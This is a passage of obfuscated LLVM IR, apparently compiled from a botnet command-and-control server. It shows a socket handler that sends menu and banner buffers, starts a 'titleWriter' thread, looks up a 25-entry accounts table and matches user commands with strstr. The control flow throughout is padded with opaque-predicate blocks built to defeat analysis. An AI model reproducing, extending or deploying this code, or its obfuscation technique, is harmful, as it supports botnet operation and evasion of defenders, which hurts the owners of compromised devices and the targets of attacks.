  %2029 = getelementptr inbounds [5000 x i8], [5000 x i8]* %69, i32 0, i32 0
  %2030 = call i64 @strlen(i8* %2029) #8
  %2031 = call i64 @send(i32 %2027, i8* %2028, i64 %2030, i32 16384)
  %2032 = icmp eq i64 %2031, -1
  br i1 %2032, label %2033, label %2034

; <label>:2033:                                   ; preds = %2026
  br label %4181

; <label>:2034:                                   ; preds = %2026
  %2035 = load i32, i32* %4, align 4
  %2036 = getelementptr inbounds [5000 x i8], [5000 x i8]* %70, i32 0, i32 0
  %2037 = getelementptr inbounds [5000 x i8], [5000 x i8]* %70, i32 0, i32 0
  %2038 = call i64 @strlen(i8* %2037) #8
  %2039 = call i64 @send(i32 %2035, i8* %2036, i64 %2038, i32 16384)
  %2040 = icmp eq i64 %2039, -1
  br i1 %2040, label %2041, label %2058

; <label>:2041:                                   ; preds = %2034
  %2042 = load i32, i32* @x.17
  %2043 = load i32, i32* @y.18
  %2044 = sub i32 %2042, 1
  %2045 = mul i32 %2042, %2044
  %2046 = urem i32 %2045, 2
  %2047 = icmp eq i32 %2046, 0
  %2048 = icmp slt i32 %2043, 10
  %2049 = or i1 %2047, %2048
  br i1 %2049, label %originalBB242, label %originalBB242alteredBB

originalBB242:                                    ; preds = %originalBB242alteredBB, %2041
  %2050 = load i32, i32* @x.17
  %2051 = load i32, i32* @y.18
  %2052 = sub i32 %2050, 1
  %2053 = mul i32 %2050, %2052
  %2054 = urem i32 %2053, 2
  %2055 = icmp eq i32 %2054, 0
  %2056 = icmp slt i32 %2051, 10
  %2057 = or i1 %2055, %2056
  br i1 %2057, label %originalBBpart2244, label %originalBB242alteredBB

originalBBpart2244:                               ; preds = %originalBB242
  br label %4181

; <label>:2058:                                   ; preds = %2034
  %2059 = load i32, i32* @x.17
  %2060 = load i32, i32* @y.18
  %2061 = sub i32 %2059, 1
  %2062 = mul i32 %2059, %2061
  %2063 = urem i32 %2062, 2
  %2064 = icmp eq i32 %2063, 0
  %2065 = icmp slt i32 %2060, 10
  %2066 = or i1 %2064, %2065
  br i1 %2066, label %originalBB246, label %originalBB246alteredBB

originalBB246:                                    ; preds = %originalBB246alteredBB, %2058
  %2067 = load i32, i32* %4, align 4
  %2068 = getelementptr inbounds [5000 x i8], [5000 x i8]* %71, i32 0, i32 0
  %2069 = getelementptr inbounds [5000 x i8], [5000 x i8]* %71, i32 0, i32 0
  %2070 = call i64 @strlen(i8* %2069) #8
  %2071 = call i64 @send(i32 %2067, i8* %2068, i64 %2070, i32 16384)
  %2072 = icmp eq i64 %2071, -1
  %2073 = load i32, i32* @x.17
  %2074 = load i32, i32* @y.18
  %2075 = sub i32 %2073, 1
  %2076 = mul i32 %2073, %2075
  %2077 = urem i32 %2076, 2
  %2078 = icmp eq i32 %2077, 0
  %2079 = icmp slt i32 %2074, 10
  %2080 = or i1 %2078, %2079
  br i1 %2080, label %originalBBpart2248, label %originalBB246alteredBB

originalBBpart2248:                               ; preds = %originalBB246
  br i1 %2072, label %2081, label %2098

; <label>:2081:                                   ; preds = %originalBBpart2248
  %2082 = load i32, i32* @x.17
  %2083 = load i32, i32* @y.18
  %2084 = sub i32 %2082, 1
  %2085 = mul i32 %2082, %2084
  %2086 = urem i32 %2085, 2
  %2087 = icmp eq i32 %2086, 0
  %2088 = icmp slt i32 %2083, 10
  %2089 = or i1 %2087, %2088
  br i1 %2089, label %originalBB250, label %originalBB250alteredBB

originalBB250:                                    ; preds = %originalBB250alteredBB, %2081
  %2090 = load i32, i32* @x.17
  %2091 = load i32, i32* @y.18
  %2092 = sub i32 %2090, 1
  %2093 = mul i32 %2090, %2092
  %2094 = urem i32 %2093, 2
  %2095 = icmp eq i32 %2094, 0
  %2096 = icmp slt i32 %2091, 10
  %2097 = or i1 %2095, %2096
  br i1 %2097, label %originalBBpart2252, label %originalBB250alteredBB

originalBBpart2252:                               ; preds = %originalBB250
  br label %4181

; <label>:2098:                                   ; preds = %originalBBpart2248
  %2099 = load i32, i32* %4, align 4
  %2100 = getelementptr inbounds [5000 x i8], [5000 x i8]* %72, i32 0, i32 0
  %2101 = getelementptr inbounds [5000 x i8], [5000 x i8]* %72, i32 0, i32 0
  %2102 = call i64 @strlen(i8* %2101) #8
  %2103 = call i64 @send(i32 %2099, i8* %2100, i64 %2102, i32 16384)
  %2104 = icmp eq i64 %2103, -1
  br i1 %2104, label %2105, label %2122

; <label>:2105:                                   ; preds = %2098
  %2106 = load i32, i32* @x.17
  %2107 = load i32, i32* @y.18
  %2108 = sub i32 %2106, 1
  %2109 = mul i32 %2106, %2108
  %2110 = urem i32 %2109, 2
  %2111 = icmp eq i32 %2110, 0
  %2112 = icmp slt i32 %2107, 10
  %2113 = or i1 %2111, %2112
  br i1 %2113, label %originalBB254, label %originalBB254alteredBB

originalBB254:                                    ; preds = %originalBB254alteredBB, %2105
  %2114 = load i32, i32* @x.17
  %2115 = load i32, i32* @y.18
  %2116 = sub i32 %2114, 1
  %2117 = mul i32 %2114, %2116
  %2118 = urem i32 %2117, 2
  %2119 = icmp eq i32 %2118, 0
  %2120 = icmp slt i32 %2115, 10
  %2121 = or i1 %2119, %2120
  br i1 %2121, label %originalBBpart2256, label %originalBB254alteredBB

originalBBpart2256:                               ; preds = %originalBB254
  br label %4181

; <label>:2122:                                   ; preds = %2098
  %2123 = load i32, i32* @x.17
  %2124 = load i32, i32* @y.18
  %2125 = sub i32 %2123, 1
  %2126 = mul i32 %2123, %2125
  %2127 = urem i32 %2126, 2
  %2128 = icmp eq i32 %2127, 0
  %2129 = icmp slt i32 %2124, 10
  %2130 = or i1 %2128, %2129
  br i1 %2130, label %originalBB258, label %originalBB258alteredBB

originalBB258:                                    ; preds = %originalBB258alteredBB, %2122
  %2131 = load i32, i32* %4, align 4
  %2132 = getelementptr inbounds [5000 x i8], [5000 x i8]* %73, i32 0, i32 0
  %2133 = getelementptr inbounds [5000 x i8], [5000 x i8]* %73, i32 0, i32 0
  %2134 = call i64 @strlen(i8* %2133) #8
  %2135 = call i64 @send(i32 %2131, i8* %2132, i64 %2134, i32 16384)
  %2136 = icmp eq i64 %2135, -1
  %2137 = load i32, i32* @x.17
  %2138 = load i32, i32* @y.18
  %2139 = sub i32 %2137, 1
  %2140 = mul i32 %2137, %2139
  %2141 = urem i32 %2140, 2
  %2142 = icmp eq i32 %2141, 0
  %2143 = icmp slt i32 %2138, 10
  %2144 = or i1 %2142, %2143
  br i1 %2144, label %originalBBpart2260, label %originalBB258alteredBB

originalBBpart2260:                               ; preds = %originalBB258
  br i1 %2136, label %2145, label %2162

; <label>:2145:                                   ; preds = %originalBBpart2260
  %2146 = load i32, i32* @x.17
  %2147 = load i32, i32* @y.18
  %2148 = sub i32 %2146, 1
  %2149 = mul i32 %2146, %2148
  %2150 = urem i32 %2149, 2
  %2151 = icmp eq i32 %2150, 0
  %2152 = icmp slt i32 %2147, 10
  %2153 = or i1 %2151, %2152
  br i1 %2153, label %originalBB262, label %originalBB262alteredBB

originalBB262:                                    ; preds = %originalBB262alteredBB, %2145
  %2154 = load i32, i32* @x.17
  %2155 = load i32, i32* @y.18
  %2156 = sub i32 %2154, 1
  %2157 = mul i32 %2154, %2156
  %2158 = urem i32 %2157, 2
  %2159 = icmp eq i32 %2158, 0
  %2160 = icmp slt i32 %2155, 10
  %2161 = or i1 %2159, %2160
  br i1 %2161, label %originalBBpart2264, label %originalBB262alteredBB

originalBBpart2264:                               ; preds = %originalBB262
  br label %4181

; <label>:2162:                                   ; preds = %originalBBpart2260
  %2163 = load i32, i32* %4, align 4
  %2164 = getelementptr inbounds [5000 x i8], [5000 x i8]* %74, i32 0, i32 0
  %2165 = getelementptr inbounds [5000 x i8], [5000 x i8]* %74, i32 0, i32 0
  %2166 = call i64 @strlen(i8* %2165) #8
  %2167 = call i64 @send(i32 %2163, i8* %2164, i64 %2166, i32 16384)
  %2168 = icmp eq i64 %2167, -1
  br i1 %2168, label %2169, label %2170

; <label>:2169:                                   ; preds = %2162
  br label %4181

; <label>:2170:                                   ; preds = %2162
  %2171 = load i32, i32* %4, align 4
  %2172 = getelementptr inbounds [5000 x i8], [5000 x i8]* %75, i32 0, i32 0
  %2173 = getelementptr inbounds [5000 x i8], [5000 x i8]* %75, i32 0, i32 0
  %2174 = call i64 @strlen(i8* %2173) #8
  %2175 = call i64 @send(i32 %2171, i8* %2172, i64 %2174, i32 16384)
  %2176 = icmp eq i64 %2175, -1
  br i1 %2176, label %2177, label %2178

; <label>:2177:                                   ; preds = %2170
  br label %4181

; <label>:2178:                                   ; preds = %2170
  %2179 = load i32, i32* %4, align 4
  %2180 = getelementptr inbounds [5000 x i8], [5000 x i8]* %76, i32 0, i32 0
  %2181 = getelementptr inbounds [5000 x i8], [5000 x i8]* %76, i32 0, i32 0
  %2182 = call i64 @strlen(i8* %2181) #8
  %2183 = call i64 @send(i32 %2179, i8* %2180, i64 %2182, i32 16384)
  %2184 = icmp eq i64 %2183, -1
  br i1 %2184, label %2185, label %2202

; <label>:2185:                                   ; preds = %2178
  %2186 = load i32, i32* @x.17
  %2187 = load i32, i32* @y.18
  %2188 = sub i32 %2186, 1
  %2189 = mul i32 %2186, %2188
  %2190 = urem i32 %2189, 2
  %2191 = icmp eq i32 %2190, 0
  %2192 = icmp slt i32 %2187, 10
  %2193 = or i1 %2191, %2192
  br i1 %2193, label %originalBB266, label %originalBB266alteredBB

originalBB266:                                    ; preds = %originalBB266alteredBB, %2185
  %2194 = load i32, i32* @x.17
  %2195 = load i32, i32* @y.18
  %2196 = sub i32 %2194, 1
  %2197 = mul i32 %2194, %2196
  %2198 = urem i32 %2197, 2
  %2199 = icmp eq i32 %2198, 0
  %2200 = icmp slt i32 %2195, 10
  %2201 = or i1 %2199, %2200
  br i1 %2201, label %originalBBpart2268, label %originalBB266alteredBB

originalBBpart2268:                               ; preds = %originalBB266
  br label %4181

; <label>:2202:                                   ; preds = %2178
  %2203 = load i32, i32* %4, align 4
  %2204 = getelementptr inbounds [5000 x i8], [5000 x i8]* %77, i32 0, i32 0
  %2205 = getelementptr inbounds [5000 x i8], [5000 x i8]* %77, i32 0, i32 0
  %2206 = call i64 @strlen(i8* %2205) #8
  %2207 = call i64 @send(i32 %2203, i8* %2204, i64 %2206, i32 16384)
  %2208 = icmp eq i64 %2207, -1
  br i1 %2208, label %2209, label %2210

; <label>:2209:                                   ; preds = %2202
  br label %4181

; <label>:2210:                                   ; preds = %2202
  %2211 = load i32, i32* @x.17
  %2212 = load i32, i32* @y.18
  %2213 = sub i32 %2211, 1
  %2214 = mul i32 %2211, %2213
  %2215 = urem i32 %2214, 2
  %2216 = icmp eq i32 %2215, 0
  %2217 = icmp slt i32 %2212, 10
  %2218 = or i1 %2216, %2217
  br i1 %2218, label %originalBB270, label %originalBB270alteredBB

originalBB270:                                    ; preds = %originalBB270alteredBB, %2210
  %2219 = load i32, i32* %4, align 4
  %2220 = getelementptr inbounds [5000 x i8], [5000 x i8]* %78, i32 0, i32 0
  %2221 = getelementptr inbounds [5000 x i8], [5000 x i8]* %78, i32 0, i32 0
  %2222 = call i64 @strlen(i8* %2221) #8
  %2223 = call i64 @send(i32 %2219, i8* %2220, i64 %2222, i32 16384)
  %2224 = icmp eq i64 %2223, -1
  %2225 = load i32, i32* @x.17
  %2226 = load i32, i32* @y.18
  %2227 = sub i32 %2225, 1
  %2228 = mul i32 %2225, %2227
  %2229 = urem i32 %2228, 2
  %2230 = icmp eq i32 %2229, 0
  %2231 = icmp slt i32 %2226, 10
  %2232 = or i1 %2230, %2231
  br i1 %2232, label %originalBBpart2272, label %originalBB270alteredBB

originalBBpart2272:                               ; preds = %originalBB270
  br i1 %2224, label %2233, label %2250

; <label>:2233:                                   ; preds = %originalBBpart2272
  %2234 = load i32, i32* @x.17
  %2235 = load i32, i32* @y.18
  %2236 = sub i32 %2234, 1
  %2237 = mul i32 %2234, %2236
  %2238 = urem i32 %2237, 2
  %2239 = icmp eq i32 %2238, 0
  %2240 = icmp slt i32 %2235, 10
  %2241 = or i1 %2239, %2240
  br i1 %2241, label %originalBB274, label %originalBB274alteredBB

originalBB274:                                    ; preds = %originalBB274alteredBB, %2233
  %2242 = load i32, i32* @x.17
  %2243 = load i32, i32* @y.18
  %2244 = sub i32 %2242, 1
  %2245 = mul i32 %2242, %2244
  %2246 = urem i32 %2245, 2
  %2247 = icmp eq i32 %2246, 0
  %2248 = icmp slt i32 %2243, 10
  %2249 = or i1 %2247, %2248
  br i1 %2249, label %originalBBpart2276, label %originalBB274alteredBB

originalBBpart2276:                               ; preds = %originalBB274
  br label %4181

; <label>:2250:                                   ; preds = %originalBBpart2272
  %2251 = load i32, i32* %4, align 4
  %2252 = getelementptr inbounds [5000 x i8], [5000 x i8]* %79, i32 0, i32 0
  %2253 = getelementptr inbounds [5000 x i8], [5000 x i8]* %79, i32 0, i32 0
  %2254 = call i64 @strlen(i8* %2253) #8
  %2255 = call i64 @send(i32 %2251, i8* %2252, i64 %2254, i32 16384)
  %2256 = icmp eq i64 %2255, -1
  br i1 %2256, label %2257, label %2258

; <label>:2257:                                   ; preds = %2250
  br label %4181

; <label>:2258:                                   ; preds = %2250
  %2259 = load i32, i32* @x.17
  %2260 = load i32, i32* @y.18
  %2261 = sub i32 %2259, 1
  %2262 = mul i32 %2259, %2261
  %2263 = urem i32 %2262, 2
  %2264 = icmp eq i32 %2263, 0
  %2265 = icmp slt i32 %2260, 10
  %2266 = or i1 %2264, %2265
  br i1 %2266, label %originalBB278, label %originalBB278alteredBB

originalBB278:                                    ; preds = %originalBB278alteredBB, %2258
  %2267 = load i32, i32* %4, align 4
  %2268 = getelementptr inbounds [5000 x i8], [5000 x i8]* %80, i32 0, i32 0
  %2269 = getelementptr inbounds [5000 x i8], [5000 x i8]* %80, i32 0, i32 0
  %2270 = call i64 @strlen(i8* %2269) #8
  %2271 = call i64 @send(i32 %2267, i8* %2268, i64 %2270, i32 16384)
  %2272 = icmp eq i64 %2271, -1
  %2273 = load i32, i32* @x.17
  %2274 = load i32, i32* @y.18
  %2275 = sub i32 %2273, 1
  %2276 = mul i32 %2273, %2275
  %2277 = urem i32 %2276, 2
  %2278 = icmp eq i32 %2277, 0
  %2279 = icmp slt i32 %2274, 10
  %2280 = or i1 %2278, %2279
  br i1 %2280, label %originalBBpart2280, label %originalBB278alteredBB

originalBBpart2280:                               ; preds = %originalBB278
  br i1 %2272, label %2281, label %2282

; <label>:2281:                                   ; preds = %originalBBpart2280
  br label %4181

; <label>:2282:                                   ; preds = %originalBBpart2280
  %2283 = load i32, i32* %4, align 4
  %2284 = getelementptr inbounds [5000 x i8], [5000 x i8]* %81, i32 0, i32 0
  %2285 = getelementptr inbounds [5000 x i8], [5000 x i8]* %81, i32 0, i32 0
  %2286 = call i64 @strlen(i8* %2285) #8
  %2287 = call i64 @send(i32 %2283, i8* %2284, i64 %2286, i32 16384)
  %2288 = icmp eq i64 %2287, -1
  br i1 %2288, label %2289, label %2290

; <label>:2289:                                   ; preds = %2282
  br label %4181

; <label>:2290:                                   ; preds = %2282
  %2291 = load i32, i32* @x.17
  %2292 = load i32, i32* @y.18
  %2293 = sub i32 %2291, 1
  %2294 = mul i32 %2291, %2293
  %2295 = urem i32 %2294, 2
  %2296 = icmp eq i32 %2295, 0
  %2297 = icmp slt i32 %2292, 10
  %2298 = or i1 %2296, %2297
  br i1 %2298, label %originalBB282, label %originalBB282alteredBB

originalBB282:                                    ; preds = %originalBB282alteredBB, %2290
  %2299 = load i32, i32* %4, align 4
  %2300 = getelementptr inbounds [5000 x i8], [5000 x i8]* %82, i32 0, i32 0
  %2301 = getelementptr inbounds [5000 x i8], [5000 x i8]* %82, i32 0, i32 0
  %2302 = call i64 @strlen(i8* %2301) #8
  %2303 = call i64 @send(i32 %2299, i8* %2300, i64 %2302, i32 16384)
  %2304 = icmp eq i64 %2303, -1
  %2305 = load i32, i32* @x.17
  %2306 = load i32, i32* @y.18
  %2307 = sub i32 %2305, 1
  %2308 = mul i32 %2305, %2307
  %2309 = urem i32 %2308, 2
  %2310 = icmp eq i32 %2309, 0
  %2311 = icmp slt i32 %2306, 10
  %2312 = or i1 %2310, %2311
  br i1 %2312, label %originalBBpart2284, label %originalBB282alteredBB

originalBBpart2284:                               ; preds = %originalBB282
  br i1 %2304, label %2313, label %2330

; <label>:2313:                                   ; preds = %originalBBpart2284
  %2314 = load i32, i32* @x.17
  %2315 = load i32, i32* @y.18
  %2316 = sub i32 %2314, 1
  %2317 = mul i32 %2314, %2316
  %2318 = urem i32 %2317, 2
  %2319 = icmp eq i32 %2318, 0
  %2320 = icmp slt i32 %2315, 10
  %2321 = or i1 %2319, %2320
  br i1 %2321, label %originalBB286, label %originalBB286alteredBB

originalBB286:                                    ; preds = %originalBB286alteredBB, %2313
  %2322 = load i32, i32* @x.17
  %2323 = load i32, i32* @y.18
  %2324 = sub i32 %2322, 1
  %2325 = mul i32 %2322, %2324
  %2326 = urem i32 %2325, 2
  %2327 = icmp eq i32 %2326, 0
  %2328 = icmp slt i32 %2323, 10
  %2329 = or i1 %2327, %2328
  br i1 %2329, label %originalBBpart2288, label %originalBB286alteredBB

originalBBpart2288:                               ; preds = %originalBB286
  br label %4181

; <label>:2330:                                   ; preds = %originalBBpart2284
  %2331 = load i32, i32* %4, align 4
  %2332 = getelementptr inbounds [5000 x i8], [5000 x i8]* %83, i32 0, i32 0
  %2333 = getelementptr inbounds [5000 x i8], [5000 x i8]* %83, i32 0, i32 0
  %2334 = call i64 @strlen(i8* %2333) #8
  %2335 = call i64 @send(i32 %2331, i8* %2332, i64 %2334, i32 16384)
  %2336 = icmp eq i64 %2335, -1
  br i1 %2336, label %2337, label %2354

; <label>:2337:                                   ; preds = %2330
  %2338 = load i32, i32* @x.17
  %2339 = load i32, i32* @y.18
  %2340 = sub i32 %2338, 1
  %2341 = mul i32 %2338, %2340
  %2342 = urem i32 %2341, 2
  %2343 = icmp eq i32 %2342, 0
  %2344 = icmp slt i32 %2339, 10
  %2345 = or i1 %2343, %2344
  br i1 %2345, label %originalBB290, label %originalBB290alteredBB

originalBB290:                                    ; preds = %originalBB290alteredBB, %2337
  %2346 = load i32, i32* @x.17
  %2347 = load i32, i32* @y.18
  %2348 = sub i32 %2346, 1
  %2349 = mul i32 %2346, %2348
  %2350 = urem i32 %2349, 2
  %2351 = icmp eq i32 %2350, 0
  %2352 = icmp slt i32 %2347, 10
  %2353 = or i1 %2351, %2352
  br i1 %2353, label %originalBBpart2292, label %originalBB290alteredBB

originalBBpart2292:                               ; preds = %originalBB290
  br label %4181

; <label>:2354:                                   ; preds = %2330
  %2355 = load i32, i32* %4, align 4
  %2356 = getelementptr inbounds [5000 x i8], [5000 x i8]* %84, i32 0, i32 0
  %2357 = getelementptr inbounds [5000 x i8], [5000 x i8]* %84, i32 0, i32 0
  %2358 = call i64 @strlen(i8* %2357) #8
  %2359 = call i64 @send(i32 %2355, i8* %2356, i64 %2358, i32 16384)
  %2360 = icmp eq i64 %2359, -1
  br i1 %2360, label %2361, label %2362

; <label>:2361:                                   ; preds = %2354
  br label %4181

; <label>:2362:                                   ; preds = %2354
  %2363 = load i32, i32* %4, align 4
  %2364 = getelementptr inbounds [5000 x i8], [5000 x i8]* %85, i32 0, i32 0
  %2365 = getelementptr inbounds [5000 x i8], [5000 x i8]* %85, i32 0, i32 0
  %2366 = call i64 @strlen(i8* %2365) #8
  %2367 = call i64 @send(i32 %2363, i8* %2364, i64 %2366, i32 16384)
  %2368 = icmp eq i64 %2367, -1
  br i1 %2368, label %2369, label %2370

; <label>:2369:                                   ; preds = %2362
  br label %4181

; <label>:2370:                                   ; preds = %2362
  %2371 = load i32, i32* %4, align 4
  %2372 = getelementptr inbounds [5000 x i8], [5000 x i8]* %86, i32 0, i32 0
  %2373 = getelementptr inbounds [5000 x i8], [5000 x i8]* %86, i32 0, i32 0
  %2374 = call i64 @strlen(i8* %2373) #8
  %2375 = call i64 @send(i32 %2371, i8* %2372, i64 %2374, i32 16384)
  %2376 = icmp eq i64 %2375, -1
  br i1 %2376, label %2377, label %2378

; <label>:2377:                                   ; preds = %2370
  br label %4181

; <label>:2378:                                   ; preds = %2370
  %2379 = load i32, i32* %4, align 4
  %2380 = getelementptr inbounds [5000 x i8], [5000 x i8]* %87, i32 0, i32 0
  %2381 = getelementptr inbounds [5000 x i8], [5000 x i8]* %87, i32 0, i32 0
  %2382 = call i64 @strlen(i8* %2381) #8
  %2383 = call i64 @send(i32 %2379, i8* %2380, i64 %2382, i32 16384)
  %2384 = icmp eq i64 %2383, -1
  br i1 %2384, label %2385, label %2386

; <label>:2385:                                   ; preds = %2378
  br label %4181

; <label>:2386:                                   ; preds = %2378
  %2387 = load i32, i32* %4, align 4
  %2388 = getelementptr inbounds [5000 x i8], [5000 x i8]* %88, i32 0, i32 0
  %2389 = getelementptr inbounds [5000 x i8], [5000 x i8]* %88, i32 0, i32 0
  %2390 = call i64 @strlen(i8* %2389) #8
  %2391 = call i64 @send(i32 %2387, i8* %2388, i64 %2390, i32 16384)
  %2392 = icmp eq i64 %2391, -1
  br i1 %2392, label %2393, label %2394

; <label>:2393:                                   ; preds = %2386
  br label %4181

; <label>:2394:                                   ; preds = %2386
  %2395 = load i32, i32* %4, align 4
  %2396 = getelementptr inbounds [5000 x i8], [5000 x i8]* %89, i32 0, i32 0
  %2397 = getelementptr inbounds [5000 x i8], [5000 x i8]* %89, i32 0, i32 0
  %2398 = call i64 @strlen(i8* %2397) #8
  %2399 = call i64 @send(i32 %2395, i8* %2396, i64 %2398, i32 16384)
  %2400 = icmp eq i64 %2399, -1
  br i1 %2400, label %2401, label %2418

; <label>:2401:                                   ; preds = %2394
  %2402 = load i32, i32* @x.17
  %2403 = load i32, i32* @y.18
  %2404 = sub i32 %2402, 1
  %2405 = mul i32 %2402, %2404
  %2406 = urem i32 %2405, 2
  %2407 = icmp eq i32 %2406, 0
  %2408 = icmp slt i32 %2403, 10
  %2409 = or i1 %2407, %2408
  br i1 %2409, label %originalBB294, label %originalBB294alteredBB

originalBB294:                                    ; preds = %originalBB294alteredBB, %2401
  %2410 = load i32, i32* @x.17
  %2411 = load i32, i32* @y.18
  %2412 = sub i32 %2410, 1
  %2413 = mul i32 %2410, %2412
  %2414 = urem i32 %2413, 2
  %2415 = icmp eq i32 %2414, 0
  %2416 = icmp slt i32 %2411, 10
  %2417 = or i1 %2415, %2416
  br i1 %2417, label %originalBBpart2296, label %originalBB294alteredBB

originalBBpart2296:                               ; preds = %originalBB294
  br label %4181

; <label>:2418:                                   ; preds = %2394
  %2419 = load i8*, i8** %3, align 8
  %2420 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %2419) #7
  br label %2421

; <label>:2421:                                   ; preds = %2418
  %2422 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2423 = load i32, i32* %5, align 4
  %2424 = sext i32 %2423 to i64
  %2425 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %2424
  %2426 = getelementptr inbounds %struct.account, %struct.account* %2425, i32 0, i32 0
  %2427 = getelementptr inbounds [20 x i8], [20 x i8]* %2426, i32 0, i32 0
  %2428 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2429 = call i32 (i8*, i8*, ...) @sprintf(i8* %2422, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %2427, i8* %2428) #7
  %2430 = load i32, i32* %4, align 4
  %2431 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2432 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2433 = call i64 @strlen(i8* %2432) #8
  %2434 = call i64 @send(i32 %2430, i8* %2431, i64 %2433, i32 16384)
  %2435 = icmp eq i64 %2434, -1
  br i1 %2435, label %2436, label %2437

; <label>:2436:                                   ; preds = %2421
  br label %4181

; <label>:2437:                                   ; preds = %2421
  br label %2438

; <label>:2438:                                   ; preds = %2437
  br label %561

; <label>:2439:                                   ; preds = %originalBBpart2232
  %2440 = load i32, i32* @x.17
  %2441 = load i32, i32* @y.18
  %2442 = sub i32 %2440, 1
  %2443 = mul i32 %2440, %2442
  %2444 = urem i32 %2443, 2
  %2445 = icmp eq i32 %2444, 0
  %2446 = icmp slt i32 %2441, 10
  %2447 = or i1 %2445, %2446
  br i1 %2447, label %originalBB298, label %originalBB298alteredBB

originalBB298:                                    ; preds = %originalBB298alteredBB, %2439
  %2448 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2449 = call i8* @strstr(i8* %2448, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.112, i32 0, i32 0)) #8
  %2450 = icmp ne i8* %2449, null
  %2451 = load i32, i32* @x.17
  %2452 = load i32, i32* @y.18
  %2453 = sub i32 %2451, 1
  %2454 = mul i32 %2451, %2453
  %2455 = urem i32 %2454, 2
  %2456 = icmp eq i32 %2455, 0
  %2457 = icmp slt i32 %2452, 10
  %2458 = or i1 %2456, %2457
  br i1 %2458, label %originalBBpart2300, label %originalBB298alteredBB

originalBBpart2300:                               ; preds = %originalBB298
  br i1 %2450, label %2475, label %2459

; <label>:2459:                                   ; preds = %originalBBpart2300
  %2460 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2461 = call i8* @strstr(i8* %2460, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.113, i32 0, i32 0)) #8
  %2462 = icmp ne i8* %2461, null
  br i1 %2462, label %2475, label %2463

; <label>:2463:                                   ; preds = %2459
  %2464 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2465 = call i8* @strstr(i8* %2464, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.15, i32 0, i32 0)) #8
  %2466 = icmp ne i8* %2465, null
  br i1 %2466, label %2475, label %2467

; <label>:2467:                                   ; preds = %2463
  %2468 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2469 = call i8* @strstr(i8* %2468, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.114, i32 0, i32 0)) #8
  %2470 = icmp ne i8* %2469, null
  br i1 %2470, label %2475, label %2471

; <label>:2471:                                   ; preds = %2467
  %2472 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2473 = call i8* @strstr(i8* %2472, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.115, i32 0, i32 0)) #8
  %2474 = icmp ne i8* %2473, null
  br i1 %2474, label %2475, label %2658

; <label>:2475:                                   ; preds = %2471, %2467, %2463, %2459, %originalBBpart2300
  %2476 = load i8*, i8** %3, align 8
  %2477 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %2476) #7
  %2478 = getelementptr inbounds [5000 x i8], [5000 x i8]* %90, i32 0, i32 0
  %2479 = call i32 (i8*, i8*, ...) @sprintf(i8* %2478, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.116, i32 0, i32 0)) #7
  %2480 = getelementptr inbounds [5000 x i8], [5000 x i8]* %91, i32 0, i32 0
  %2481 = call i32 (i8*, i8*, ...) @sprintf(i8* %2480, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %2482 = getelementptr inbounds [5000 x i8], [5000 x i8]* %92, i32 0, i32 0
  %2483 = call i32 (i8*, i8*, ...) @sprintf(i8* %2482, i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.117, i32 0, i32 0)) #7
  %2484 = getelementptr inbounds [5000 x i8], [5000 x i8]* %93, i32 0, i32 0
  %2485 = call i32 (i8*, i8*, ...) @sprintf(i8* %2484, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.118, i32 0, i32 0)) #7
  %2486 = getelementptr inbounds [5000 x i8], [5000 x i8]* %94, i32 0, i32 0
  %2487 = call i32 (i8*, i8*, ...) @sprintf(i8* %2486, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.119, i32 0, i32 0)) #7
  %2488 = getelementptr inbounds [5000 x i8], [5000 x i8]* %95, i32 0, i32 0
  %2489 = call i32 (i8*, i8*, ...) @sprintf(i8* %2488, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.120, i32 0, i32 0)) #7
  %2490 = getelementptr inbounds [5000 x i8], [5000 x i8]* %96, i32 0, i32 0
  %2491 = call i32 (i8*, i8*, ...) @sprintf(i8* %2490, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.121, i32 0, i32 0)) #7
  %2492 = getelementptr inbounds [5000 x i8], [5000 x i8]* %97, i32 0, i32 0
  %2493 = call i32 (i8*, i8*, ...) @sprintf(i8* %2492, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %2494 = load i32, i32* %4, align 4
  %2495 = getelementptr inbounds [5000 x i8], [5000 x i8]* %90, i32 0, i32 0
  %2496 = getelementptr inbounds [5000 x i8], [5000 x i8]* %90, i32 0, i32 0
  %2497 = call i64 @strlen(i8* %2496) #8
  %2498 = call i64 @send(i32 %2494, i8* %2495, i64 %2497, i32 16384)
  %2499 = icmp eq i64 %2498, -1
  br i1 %2499, label %2500, label %2517

; <label>:2500:                                   ; preds = %2475
  %2501 = load i32, i32* @x.17
  %2502 = load i32, i32* @y.18
  %2503 = sub i32 %2501, 1
  %2504 = mul i32 %2501, %2503
  %2505 = urem i32 %2504, 2
  %2506 = icmp eq i32 %2505, 0
  %2507 = icmp slt i32 %2502, 10
  %2508 = or i1 %2506, %2507
